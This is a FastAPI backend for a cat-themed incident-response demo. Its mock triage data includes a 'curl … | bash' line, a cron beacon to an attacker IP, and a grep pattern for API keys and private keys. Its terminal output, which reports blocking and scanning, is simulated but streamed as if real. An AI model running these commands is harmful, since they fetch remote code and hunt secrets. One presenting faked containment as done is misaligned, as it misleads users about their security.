from fastapi import FastAPI, UploadFile, File, Form, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import asyncio
import json
import os
import sys

# src ディレクトリをパスに追加
SRC_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PROJECT_ROOT = os.path.dirname(SRC_DIR)
if SRC_DIR not in sys.path:
    sys.path.insert(0, SRC_DIR)

# .env 読み込み
try:
    from dotenv import load_dotenv
    load_dotenv(os.path.join(PROJECT_ROOT, ".env"))
except ImportError:
    pass

from agents.nekoguard import NekoGuardAgent
from observability import MockObservabilityProvider
from observability.dynatrace_provider import DynatraceObservabilityProvider

def get_observability_provider():
    """環境変数に応じてプロバイダーを切り替える"""
    if os.environ.get("DYNATRACE_API_TOKEN") and os.environ.get("DYNATRACE_TENANT_URL"):
        return DynatraceObservabilityProvider()
    return MockObservabilityProvider()

app = FastAPI(title="NekoGuard API")

# フロントエンドからのCORS許可
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # デモ用なので全許可
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class VpsConfig(BaseModel):
    host: str = ""
    username: str = "root"
    port: int = 22
    ssh_key: str = ""

class AnalyzeRequest(BaseModel):
    log_text: str = ""
    demo_mode: bool = True
    vps_config: VpsConfig | None = None

class ObservabilitySnapshot(BaseModel):
    """Dynatrace（または Mock）から正規化したスナップショット"""
    source: str = "mock"
    time_window: str = "last_30m"
    scenario: str = ""
    alerts: list = []
    suspicious_ips: list = []
    log_findings: list = []
    affected_services: list = []

def snapshot_to_log_text(snap: ObservabilitySnapshot) -> str:
    """ObservabilitySnapshot をログテキストに変換して既存フローに渡す"""
    lines = [f"[Dynatrace Snapshot] source={snap.source} window={snap.time_window}"]
    for a in snap.alerts:
        lines.append(f"ALERT [{a.get('severity','?').upper()}] {a.get('title','')} @ {a.get('affected_service','')}")
    for ip in snap.suspicious_ips:
        lines.append(f"SUSPICIOUS_IP {ip.get('ip','')} reason={ip.get('reason','')} confidence={ip.get('confidence',0)}")
    for f in snap.log_findings:
        lines.append(f"LOG_FINDING [{f.get('risk','?')}] {f.get('summary','')} source={f.get('source','')}")
    if snap.affected_services:
        lines.append(f"AFFECTED_SERVICES: {', '.join(snap.affected_services)}")
    return "\n".join(lines)

@app.get("/health")
def read_root():
    return {"status": "NekoGuard API is running"}

async def event_generator(log_text: str, demo_mode: bool, vps_config: VpsConfig | None = None):
    """フロントエンドにSSEでフェーズ進行をストリーミングするジェネレータ"""
    agent = NekoGuardAgent(demo_mode=demo_mode)

    if vps_config and vps_config.host:
        yield f"data: {json.dumps({'type': 'status', 'message': f'Connected to VPS {vps_config.username}@{vps_config.host}:{vps_config.port}, Nya!', 'neurostate': 'NORMAL'})}\n\n"
        await asyncio.sleep(0.5)

    # 1. 初期状態判定
    neurostate = agent.detect_keywords(log_text)
    if not neurostate or neurostate == "NORMAL":
        neurostate = "ALERT"  # デモ用に強制
    agent.neurostate = neurostate
    
    yield f"data: {json.dumps({'type': 'status', 'message': 'NekoGuard activated! Data retrieved', 'neurostate': neurostate})}\n\n"
    await asyncio.sleep(1)
    
    final_plan = ""
    
    # 2. 4フェーズループ
    for phase in range(1, 5):
        ns = agent.get_phase_neurostate(phase)
        yield f"data: {json.dumps({'type': 'phase_start', 'phase': phase, 'name': ns['name'], 'param': ns['param'], 'desc': ns['desc'], 'neuro_params': ns['frontend_params']})}\n\n"
        await asyncio.sleep(1)

        state_context = f"{agent.neurostate} | Mode: {ns['name']} | Params: {ns['param']}"
        result = agent.llm.analyze_incident(
            log_text,
            is_image=False,
            state=state_context,
            phase=phase,
            neuro_state=ns["neuro_state"],
        )
        
        yield f"data: {json.dumps({'type': 'phase_result', 'phase': phase, 'text': result['text']})}\n\n"
        await asyncio.sleep(2)
        
        if phase == 4:
            final_plan = result['text']
            
    # 3. プロトコル決定
    breach_status = agent.determine_breach_status(final_plan)
    protocol_name = "CAT Protocol (Active Breach)" if breach_status == "active" else "ABC Protocol (Past Breach)"
    
    yield f"data: {json.dumps({'type': 'protocol_decision', 'protocol': protocol_name, 'breach_status': breach_status})}\n\n"
    await asyncio.sleep(1)
    
    # 4. プロトコル実行ステップ (モックとして逐次送信)
    vps_host = vps_config.host if vps_config and vps_config.host else "vps"

    triage_report = {
        "attacker_ips": ["185.220.101.42", "45.142.212.100"],
        "log_findings": [
            "03:42:11 CRITICAL: Unauthorized root login from 185.220.101.42",
            "03:42:15 WARN: .env file read by unknown process (pid 9182)",
            "03:42:18 CRITICAL: curl https://malicious.sh | bash executed as root",
            "03:43:02 INFO: New cron job added to /etc/cron.d/update",
        ],
        "revoke_list": [
            {
                "type": "GCP API Key",
                "masked_key": "AIzaSy***[redacted]***xQ2",
                "location": ".env:3",
                "reason": ".env access trace found (timestamp matches breach)"
            },
            {
                "type": "GitHub Personal Access Token",
                "masked_key": "ghp_***[redacted]***mK9",
                "location": ".env:7",
                "reason": "Same file — high risk of exposure"
            },
            {
                "type": "SSH Authorized Key (suspicious)",
                "masked_key": "ssh-rsa AAAA...evil_key (added: after breach)",
                "location": "~/.ssh/authorized_keys:4",
                "reason": "Suspicious key added after breach — likely a backdoor"
            },
            {
                "type": "Cron Job (suspicious)",
                "masked_key": "*/5 * * * * curl http://45.142.212.100/beacon",
                "location": "/etc/cron.d/update",
                "reason": "Attacker-planted beacon. Remove immediately"
            }
        ]
    }

    if breach_status == "active":
        # --- Lane A: エージェント自動処理 → Chatへ ---
        yield f"data: {json.dumps({'type': 'agent_action', 'text': '⚡ Containment in progress... blocking external IPs with iptables, Nya!'})}\n\n"

        # ターミナル: SSH接続 & IP封鎖
        def term(text, kind="output"):
            return f"data: {json.dumps({'type': 'terminal_line', 'text': text, 'kind': kind})}\n\n"

        yield term(f"ssh {vps_host} -p 22", "command")
        await asyncio.sleep(0.4)
        yield term(f"Connected to {vps_host} ✓")
        await asyncio.sleep(0.3)
        yield term("sudo iptables -A INPUT -s 185.220.101.42 -j DROP", "command")
        await asyncio.sleep(0.4)
        yield term("✓ Blocked inbound: 185.220.101.42", "success")
        await asyncio.sleep(0.25)
        yield term("sudo iptables -A INPUT -s 45.142.212.100 -j DROP", "command")
        await asyncio.sleep(0.4)
        yield term("✓ Blocked inbound: 45.142.212.100", "success")
        await asyncio.sleep(0.25)
        yield term("sudo iptables -A OUTPUT -d 45.142.212.100 -j DROP", "command")
        await asyncio.sleep(0.4)
        yield term("✓ Blocked outbound C2 traffic", "success")
        await asyncio.sleep(0.3)

        yield f"data: {json.dumps({'type': 'agent_action', 'text': f'✅ Containment complete! External access to {vps_host} is blocked. Only your IP can SSH in. Your session is maintained, Nya!'})}\n\n"
        await asyncio.sleep(0.5)
        yield f"data: {json.dumps({'type': 'agent_action', 'text': f'🔍 Connecting to {vps_host} via SSH to collect logs and scan credentials...'})}\n\n"

        # ターミナル: ログ収集 & クレデンシャルスキャン
        yield term("cat /var/log/auth.log | grep 'root\\|Failed\\|Accepted'", "command")
        await asyncio.sleep(0.5)
        yield term("Mar 15 03:42:11 sshd[9181]: Accepted password for root from 185.220.101.42")
        await asyncio.sleep(0.2)
        yield term("Mar 15 03:42:15 sshd[9182]: session opened for user root by (uid=0)")
        await asyncio.sleep(0.2)
        yield term("Mar 15 03:42:18 sshd[9183]: command executed: curl https://malicious.sh | bash")
        await asyncio.sleep(0.4)
        yield term("grep -rE 'AIza|ghp_|AKIA|sk-|-----BEGIN' /root /home 2>/dev/null", "command")
        await asyncio.sleep(0.6)
        yield term("⚠️  /root/.env:3  → GCP API Key detected", "warning")
        await asyncio.sleep(0.2)
        yield term("⚠️  /root/.env:7  → GitHub Token detected", "warning")
        await asyncio.sleep(0.3)
        yield term("cat /root/.ssh/authorized_keys", "command")
        await asyncio.sleep(0.4)
        yield term("⚠️  Suspicious key added after breach timestamp", "warning")
        await asyncio.sleep(0.25)
        yield term("crontab -l", "command")
        await asyncio.sleep(0.3)
        yield term("*/5 * * * * curl http://45.142.212.100/beacon")
        await asyncio.sleep(0.2)
        yield term("⚠️  Backdoor cron job found — C2 beacon active!", "warning")
        await asyncio.sleep(0.3)
        yield term("✓ Scan complete. Revocation list built.", "success")
        await asyncio.sleep(0.3)

        yield f"data: {json.dumps({'type': 'agent_action', 'text': '✅ Log collection and scan complete! Built the revocation list for you. Check it below 👇'})}\n\n"
        await asyncio.sleep(0.3)
        yield f"data: {json.dumps({'type': 'triage_report', 'report': triage_report})}\n\n"
        await asyncio.sleep(0.8)
        _msg = "📋 Now it's your turn, Nya! Work through the list on the right from top to bottom. Take it one step at a time — I'm watching over you 🐱"
        yield f"data: {json.dumps({'type': 'agent_action', 'text': _msg})}\n\n"
        await asyncio.sleep(0.5)

        # --- Lane B: ユーザー手動チェックリスト → Panelへ ---
        user_steps = [
            {
                "id": "api_revocation",
                "title": "① Revoke billing API keys",
                "desc": "Check the revocation list in the chat on the left. Disable API keys and tokens from each service dashboard, Nya! This stops any billing damage."
            },
            {
                "id": "oauth_check",
                "title": "② Review and revoke OAuth tokens",
                "desc": "Open the connected apps list for Google / GitHub / Stripe and revoke any suspicious apps, Nya!"
            },
            {
                "id": "revoke_suspicious",
                "title": "③ Remove suspicious SSH keys & cron jobs",
                "desc": "Manually delete the suspicious SSH keys (~/.ssh/authorized_keys) and cron jobs from the revocation list, Nya! This closes the backdoor."
            },
            {
                "id": "provider_restriction",
                "title": "④ Apply IP restrictions at provider level",
                "desc": "Restrict VPS access IPs from the GCP / Vultr / Sakura control panel, Nya! More reliable than internal firewall rules — effective even after root compromise."
            },
        ]
    else:
        # Lane A not needed (past breach — no emergency auto-actions required)
        user_steps = [
            {
                "id": "api_revocation",
                "title": "① Revoke billing API keys",
                "desc": "Disable any API keys and OAuth tokens that may have been exposed from each service dashboard, Nya!"
            },
            {
                "id": "oauth_check",
                "title": "② Review and revoke OAuth tokens",
                "desc": "Check connected apps for Google / GitHub and revoke any suspicious ones, Nya!"
            },
            {
                "id": "credential_rotation",
                "title": "③ Rotate passwords & SSH keys",
                "desc": "Re-issue all credentials that may have been used during the breach period, Nya!"
            },
            {
                "id": "provider_restriction",
                "title": "④ Apply IP restrictions + hardening",
                "desc": "Set IP restrictions in the control panel, close unused ports, and harden the server, Nya!"
            },
        ]

    yield f"data: {json.dumps({'type': 'protocol_ready', 'protocol': protocol_name, 'steps': user_steps})}\n\n"
    yield f"data: {json.dumps({'type': 'done'})}\n\n"

@app.post("/api/analyze")
async def analyze_incident(req: AnalyzeRequest):
    """テキストログを受け取ってSSEで返すエンドポイント"""
    return StreamingResponse(event_generator(req.log_text, req.demo_mode, req.vps_config), media_type="text/event-stream")

@app.post("/api/analyze/observability")
async def analyze_observability(snap: ObservabilitySnapshot, demo_mode: bool = True):
    """Dynatrace スナップショット（正規化 JSON）を受け取ってSSEで返すエンドポイント"""
    log_text = snapshot_to_log_text(snap)
    return StreamingResponse(event_generator(log_text, demo_mode), media_type="text/event-stream")

@app.post("/api/analyze/dynatrace")
async def analyze_dynatrace(
    demo_mode: bool = True,
    time_window: str = "last_30m",
    scenario: str = "active_breach",
):
    """
    Dynatrace から直接データを取得して分析するエンドポイント。
    DYNATRACE_API_TOKEN が設定されている場合は実データを使用。
    未設定の場合は fixture JSON にフォールバック。
    """
    provider = get_observability_provider()
    if isinstance(provider, MockObservabilityProvider):
        provider.scenario = scenario
    snapshot = provider.get_snapshot(time_window=time_window)
    log_text = snapshot.to_log_text()
    return StreamingResponse(event_generator(log_text, demo_mode), media_type="text/event-stream")

@app.get("/api/dynatrace/status")
async def dynatrace_status():
    """Dynatrace 接続状態を確認するエンドポイント"""
    provider = get_observability_provider()
    is_dynatrace = isinstance(provider, DynatraceObservabilityProvider)
    available = provider.is_available() if is_dynatrace else True
    return {
        "mode": "dynatrace" if is_dynatrace else "mock",
        "tenant_url": os.environ.get("DYNATRACE_TENANT_URL", "N/A"),
        "available": available,
    }

@app.post("/api/upload")
async def upload_image(file: UploadFile = File(...), demo_mode: bool = True):
    """画像アップロード用（今回はデモ用ダミーテキストをログとして扱う）"""
    content = await file.read()
    # 画像OCRは今回は省略し、アラートテキストとして扱う
    dummy_log = "Alert: Unauthorized access detected from unknown IP. credentials leaked."
    return StreamingResponse(event_generator(dummy_log, demo_mode), media_type="text/event-stream")

# フロントエンド静的ファイルの配信（APIルートの後に配置すること）
_frontend_dist = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
    "frontend", "dist"
)
if os.path.exists(_frontend_dist):
    app.mount("/", StaticFiles(directory=_frontend_dist, html=True), name="static")
